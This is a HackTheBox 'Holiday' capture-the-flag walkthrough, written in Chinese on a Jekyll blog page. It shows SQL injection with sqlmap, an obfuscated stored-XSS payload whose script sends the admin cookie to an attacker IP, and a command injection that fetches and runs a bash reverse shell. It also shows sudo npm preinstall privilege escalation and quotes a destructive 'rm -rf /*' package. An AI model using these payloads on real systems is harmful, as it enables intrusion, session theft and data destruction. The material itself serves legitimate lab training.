@@ -1,0 +1,762 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HackTheBox - Holiday - Yueyejian’s Blog</title>
+<meta name="description" content="">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="HackTheBox - Holiday">
+<meta property="og:url" content="http://localhost:4000/hack-the-box/holiday/">
+
+
+  <meta property="og:description" content="">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2023-04-18T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/hack-the-box/holiday/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://yueyejian13.github.io">
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox - Holiday">
+    <meta itemprop="description" content="">
+    <meta itemprop="datePublished" content="2023-04-18T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox - Holiday
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-04-18T00:00:00+08:00">April 18, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#信息搜集">信息搜集</a><ul><li><a href="#nmap">nmap</a></li><li><a href="#dirserch">dirserch</a></li><li><a href="#sqlmap">sqlmap</a></li></ul></li><li><a href="#储存型xss">储存型XSS</a></li><li><a href="#command-injection">Command Injection</a></li><li><a href="#提权">提权</a><ul><li><a href="#npm-install-dangerous">npm install dangerous</a></li></ul></li><li><a href="#小结">小结</a></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p><img src="/images/hackthebox/holiday/0.png" alt="" /></p>
+
+<h2 id="信息搜集">信息搜集</h2>
+<h3 id="nmap">nmap</h3>
+<p>通过nmap扫描发现了靶机只存在ssh和Node.js框架下的http服务。进入网站首页并没有发现什么有用的信息。</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Tue Apr 18 07:38:06 2023 as: nmap -Pn -sV -sC -A -oN nmap.txt 10.10.10.25
+Nmap scan report for 10.10.10.25
+Host is up (0.26s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
+|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
+|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
+8000/tcp open  http    Node.js Express framework
+|_http-title: Error
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=4/18%OT=22%CT=1%CU=34005%PV=Y%DS=2%DC=T%G=Y%TM=643E815
+OS:5%P=i686-pc-windows-windows)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(
+OS:SP=100%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ(CI=I%II=I)OPS(O1=M550ST11NW
+OS:7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550ST11NW7%O6=M550ST
+OS:11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40
+OS:%W=7210%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R
+OS:=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+OS:T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%U
+OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT       ADDRESS
+1   258.00 ms 10.10.14.1
+2   258.00 ms 10.10.10.25
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Apr 18 07:39:01 2023 -- 1 IP address (1 host up) scanned in 55.41 seconds
+</code></pre></div></div>
+<h3 id="dirserch">dirserch</h3>
+<p><img src="/images/hackthebox/holiday/1.png" alt="" /></p>
+
+<p>访问/login或者访问/admin跳转至login是一个简单的登录页面，尝试了默认用户以及爆破用户名都回显 Invalid User</p>
+
+<p><img src="/images/hackthebox/holiday/2.png" alt="" /></p>
+
+<p>通过简单的手工测试，发现账号后面加上双引号产生报错，sql注入大概率有了</p>
+
+<p><img src="/images/hackthebox/holiday/3.png" alt="" /></p>
+
+<h3 id="sqlmap">sqlmap</h3>
+
+<p>把数据包丢进sqlmap里面跑，但是不加参数跑不出来，需要加上level和risk</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5
+=================================================================================================================
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 474 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=admin") OR NOT 8580=8580 AND ("MLnl"="MLnl&amp;password=admin
+
+    Type: time-based blind
+    Title: SQLite &gt; 2.0 OR time-based blind (heavy query)
+    Payload: username=admin") OR 3510=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("YPRb"="
+YPRb&amp;password=admin
+---
+[08:32:00] [INFO] the back-end DBMS is SQLite
+web application technology: Express
+back-end DBMS: SQLite
+</code></pre></div></div>
+
+<p>查看表</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 --tables
+================================================================================
+&lt;current&gt;
+[5 tables]
++-----------------+
+| bookings        |
+| notes           |
+| sessions        |
+| sqlite_sequence |
+| users           |
++-----------------+
+</code></pre></div></div>
+<p>查看user表中的数据，得到账号 RickA和密码的md5，解密后得到密码</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 -T users --dump
+===========================================================================================================================
+[08:38:00] [INFO] retrieved: 103
+[08:39:13] [INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active
+ TINYINT(1))
+[08:39:13] [INFO] fetching entries for table 'users'
+[08:39:13] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
+[08:39:13] [INFO] retrieved: 1
+[08:39:14] [INFO] retrieving the length of query output
+[08:39:14] [INFO] retrieved: 1
+[08:39:16] [INFO] retrieved: 1
+[08:39:19] [INFO] retrieving the length of query output
+[08:39:19] [INFO] retrieved: 1
+[08:39:20] [INFO] retrieved: 1
+[08:39:23] [INFO] retrieving the length of query output
+[08:39:23] [INFO] retrieved: 32
+[08:39:49] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
+[08:39:49] [INFO] retrieving the length of query output
+[08:39:49] [INFO] retrieved: 5
+[08:39:55] [INFO] retrieved: RickA
+[08:39:55] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: &lt;current&gt;
+Table: users
+[1 entry]
++----+--------+----------+----------------------------------+
+| id | active | username | password                         |
++----+--------+----------+----------------------------------+
+| 1  | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
++----+--------+----------+----------------------------------+
+</code></pre></div></div>
+
+<h2 id="储存型xss">储存型XSS</h2>
+
+<p>登录RickA的账号后，得到一个订单管理系统。随便点开一个订单，里面有一个添加note的功能，而且此处提供了线索，提交的留言将在一分钟之内被管理员审核，故可尝试XSS来让管理员执行JavaScript脚本。</p>
+
+<p><img src="/images/hackthebox/holiday/4.png" alt="" /></p>
+
+<p>尝试提交<code class="language-plaintext highlighter-rouge">&lt;script src='http://10.10.14.2/xsstest'&gt;&lt;/script&gt;</code></p>
+
+<p><img src="/images/hackthebox/holiday/5.png" alt="" /></p>
+
+<p>发现脚本中的<code class="language-plaintext highlighter-rouge">&lt;</code>和<code class="language-plaintext highlighter-rouge">&gt;</code>被编码成了<code class="language-plaintext highlighter-rouge">&amp;amp;lt;</code>和<code class="language-plaintext highlighter-rouge">&amp;amp;gt;</code>，而且本地没有任何反应。</p>
+
+<p>以下文档存在很多xss绕过手法，很有参考价值。</p>
+
+<p>https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</p>
+
+<p>最后绕过的方法是</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(CHARCODE_HERE));&lt;/script&gt;"&gt;</code></p>
+
+<p>其中的CHARCODE_HERE由<code class="language-plaintext highlighter-rouge">document.write('&lt;script src="http://10.10.14.2/yyj.js"&gt;&lt;/script&gt;');</code>转化成CharCode得到</p>
+
+<p>python代码如下：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; payload='''document.write('&lt;script src="http://10.10.14.2/yyj.js"&gt;&lt;/script&gt;');'''
+&gt;&gt;&gt; ','.join([str(ord(c)) for c in payload])
+'100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,1
+12,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59'
+</code></pre></div></div>
+<p>最后得到的payload：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"&gt;
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 80
+listening on [any] 80 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 43950
+GET /yyj.js HTTP/1.1
+Accept: */*
+Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,*
+Host: 10.10.14.2
+</code></pre></div></div>
+<p>接下来在本机起一个http服务</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530\Desktop\Holiday&gt;python -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+</code></pre></div></div>
+<p>yyj.js文件内容：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.addEventListener('DOMContentLoaded', function(e) {
+    window.location = "http://10.10.14.2:81/?cookie=" + encodeURI(document.getElementsByName("cookie")[0].value)
+})
+</code></pre></div></div>
+<p>然后在监听81端口以及80端口的yyj.js文件可以正常访问的情况下，重新提交最终的payload</p>
+
+<p><img src="/images/hackthebox/holiday/6.png" alt="" /></p>
+
+<p>得到管理员的cookie</p>
+
+<p><img src="/images/hackthebox/holiday/7.png" alt="" /></p>
+
+<h2 id="command-injection">Command Injection</h2>
+
+<p><img src="/images/hackthebox/holiday/8.png" alt="" /></p>
+
+<p>通过cookie伪造了管理员之后访问 /admin得到了导出订单的按钮，点击之后可以发现是类似数据库的查询功能，并且可查数据库中之前用到的users表</p>
+
+<p><img src="/images/hackthebox/holiday/9.png" alt="" /></p>
+
+<p>随便在users后面加一个双引号试试，得到了以下的返回，我们的表名限制在了小写字母、数字、<code class="language-plaintext highlighter-rouge">&amp;</code> 、<code class="language-plaintext highlighter-rouge">/</code>以及空格组成的白名单内</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid table name - only characters in the range of [a-z0-9&amp;\s\/] are allowed
+</code></pre></div></div>
+
+<p>经测试，用url编码之后的<code class="language-plaintext highlighter-rouge">&amp;</code>拼接语句可触发命令注入漏洞<code class="language-plaintext highlighter-rouge">/admin/export?table=users%26id</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
+1|RickA|fdc8cd4cff2c19e0d1022e78481ddf36|1
+</code></pre></div></div>
+
+<p>现在注入点有了，但是存在白名单限制，怎么去bypass呢？可以先在本机起一个http服务，把反弹shell的脚本挂在上面，然后用wget命令访问十进制或者六进制转换后的ip地址+文件名，再用bash命令执行此文件。</p>
+
+<p>以下网站有一些简单的反弹shell脚本：
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</p>
+
+<p>前面挂js恶意代码的时候已经开启了http服务了，我们只需要在网站根目录新建一个用来反弹shell的文件，名叫rev</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#! /bin/bash
+bash -i &gt;&amp; /dev/tcp/10.0.14.2/2333 0&gt;&amp;1
+</code></pre></div></div>
+<p>然后用nc监听2333端口</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lvp 2333
+listening on [any] 2333 ...
+</code></pre></div></div>
+
+<p>把本地的ip地址转换成十进制数</p>
+
+<p>https://www.browserling.com/tools/ip-to-dec</p>
+
+<p><img src="/images/hackthebox/holiday/10.png" alt="" /></p>
+
+<p>值得一提的是十进制和六进制的ip地址都可以被windows、linux系统解析，比如把127.0.0.1分别转换成十进制和六进制<code class="language-plaintext highlighter-rouge">2130706433</code> <code class="language-plaintext highlighter-rouge">0x7f000001</code>，ping一下试试</p>
+
+<p><img src="/images/hackthebox/holiday/11.png" alt="" /></p>
+
+<p>上传rev，回显200
+<img src="/images/hackthebox/holiday/12.png" alt="" /></p>
+
+<p>并且web服务器也收到信号</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - [18/Apr/2023 22:05:48] "GET /rev HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>通过ls命令可以看到rev文件上传成功了，因为网有点卡我多点了几次，所以有重复的文件，但是我们只需要看rev就行了
+<img src="/images/hackthebox/holiday/13.png" alt="" /></p>
+
+<p>访问<code class="language-plaintext highlighter-rouge">/admin/export?table=b%26bash+rev</code>执行反弹shell命令，成功得到了webshell</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 2333
+listening on [any] 2333 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 46894
+bash: cannot set terminal process group (1137): Inappropriate ioctl for device
+bash: no job control in this shell
+algernon@holiday:~/app$ whoami
+whoami
+algernon
+algernon@holiday:~/app$
+</code></pre></div></div>
+
+<p>成功拿到第一个flag</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/app$ cd ..
+cd ..
+algernon@holiday:~$ ls
+ls
+app
+user.txt
+algernon@holiday:~$ cat user.txt
+cat user.txt
+e9451...........................
+</code></pre></div></div>
+<h2 id="提权">提权</h2>
+
+<h3 id="npm-install-dangerous">npm install dangerous</h3>
+
+<p>首先检查一下<code class="language-plaintext highlighter-rouge">sudo -l</code>，有可能会发现惊喜</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~$ sudo -l
+sudo -l
+Matching Defaults entries for algernon on holiday:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User algernon may run the following commands on holiday:
+    (ALL) NOPASSWD: /usr/bin/npm i *
+</code></pre></div></div>
+
+<p>发现npm可以不需要密码以管理员权限运行<code class="language-plaintext highlighter-rouge">/usr/bin/npm i *</code>，npm的全称是Node Package Manager，是一个NodeJS包管理和分发工具，已经成为了非官方的发布Node模块（包）的标准。</p>
+
+<p>谷歌一下npm install dangerous，大概思路是nodejs包是一个叫<code class="language-plaintext highlighter-rouge">package.json</code>的文件，其格式如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+  "name": "rimrafall",
+  "version": "1.0.0",
+  "description": "rm -rf /* # DO NOT INSTALL THIS",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "rm -rf /* /.*"
+  },
+  "keywords": [
+    "rimraf",
+    "rmrf"
+  ],
+  "author": "João Jerónimo",
+  "license": "ISC"
+}
+</code></pre></div></div>
+<p>其中<code class="language-plaintext highlighter-rouge">preinstall</code>中的预安装命令会在安装这个包之前执行。这也是为什么npm install存在危险。在这台靶机中我们需要创建一个文件夹，再创建一个<code class="language-plaintext highlighter-rouge">package.json</code>来模拟nodejs应用，node包中需要有name和version这两个参数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj$ cat package.json
+cat package.json
+{
+  "name": "root_please",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "/bin/bash"
+  }
+}
+</code></pre></div></div>
+<p>在package.json的上一级目录yyj执行<code class="language-plaintext highlighter-rouge">sudo npm i yyj/ --unsafe</code>就能获取root权限了，随后拿到root权限下的flag</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj$ cd ..
+cd ..
+algernon@holiday:~$ ls
+ls
+app
+node_modules
+user.txt
+yyj
+algernon@holiday:~$ sudo npm i yyj/ --unsafe
+sudo npm i yyj/ --unsafe
+
+&gt; root_please@1.0.0 preinstall /home/algernon/node_modules/.staging/root_please-f4b1cb59
+&gt; /bin/bash
+
+ls
+package.json
+whoami
+root
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@holiday:~/node_modules/.staging/root_please-f4b1cb59# cd /root
+cd /root
+root@holiday:/root# ls
+ls
+root.txt
+root@holiday:/root# cat root.txt
+cat root.txt
+592d9c91924793c4c8b8ed..........
+</code></pre></div></div>
+<h2 id="小结">小结</h2>
+<p>这是我pawd的第一台hackthebox靶机，看到这个界面心里难免有些激动，虽然是看walkthrough做出来的，但是也花了大概一两天的时间拿下靶机以及完成记录。就当做是一个新的开始吧！走起~</p>
+
+<p><img src="/images/hackthebox/holiday/14.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command-injection</a><span class="sep">, </span>
+    
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      <a href="/tags/#node" class="page__taxonomy-item" rel="tag">node</a><span class="sep">, </span>
+    
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
+    
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a><span class="sep">, </span>
+    
+      <a href="/tags/#xss" class="page__taxonomy-item" rel="tag">xss</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">hack-the-box</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-04-18T00:00:00+08:00">April 18, 2023</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/ctf/geekchall/" class="pagination--pager" title="极客大挑战2019 - SQLI
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
